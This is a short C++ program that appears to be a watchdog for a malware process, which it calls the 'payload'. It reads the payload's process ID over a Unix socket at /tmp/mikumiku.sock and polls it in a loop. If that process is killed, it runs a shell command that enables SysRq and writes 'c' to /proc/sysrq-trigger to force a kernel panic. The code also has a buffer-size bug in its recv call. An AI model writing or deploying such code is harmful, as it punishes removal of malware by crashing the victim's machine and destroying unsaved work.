#include <cstdlib>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>
#include <cstring>
#include <iostream>
#include <csignal>

#define IPC_SOCKET "/tmp/mikumiku.sock"

int sock_fd = -1;
pid_t serverPid;
int initializeIPCConnection() {
        sock_fd = socket(AF_UNIX, SOCK_STREAM, 0);
        if (sock_fd == -1) {
                perror("socket failed");
                return EXIT_FAILURE;
        }

        sockaddr_un addr;
        memset(&addr, 0, sizeof(addr));
        addr.sun_family = AF_UNIX;
        strncpy(addr.sun_path, IPC_SOCKET, sizeof(addr.sun_path) - 1);

        if (connect(sock_fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
                perror("connect failed");
                return EXIT_FAILURE;
        }

        return EXIT_SUCCESS;
}

int sendIPCMessage(const char* msg, char buffer[256]) {
        if (send(sock_fd, msg, strlen(msg), 0) == -1) {
                perror("send failed");
                return EXIT_FAILURE;

        }

        ssize_t bytes = recv(sock_fd, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
                buffer[bytes] = '\0';
                std::cout << "response: " << buffer << "\n";
        }
        close(sock_fd);
        return EXIT_SUCCESS;
}

int main(int argc, char* argv[]) {
        initializeIPCConnection();
        char buffer[256];
        sendIPCMessage("pid", buffer); // request pid
        serverPid = static_cast<pid_t>(atoi(buffer)); // parse response into serverPid
        std::cout << "serverPid is: " << serverPid << "\nbuffer is: " << buffer << "\n";
        
        while (true) {
                if (kill(serverPid, 0) == -1) {
                        std::cout << "payload was killed... initiating kernel panic.";
                        system("echo 1 | tee /proc/sys/kernel/sysrq && echo c | tee /proc/sysrq-trigger");
                }
        }

        return EXIT_SUCCESS;
}
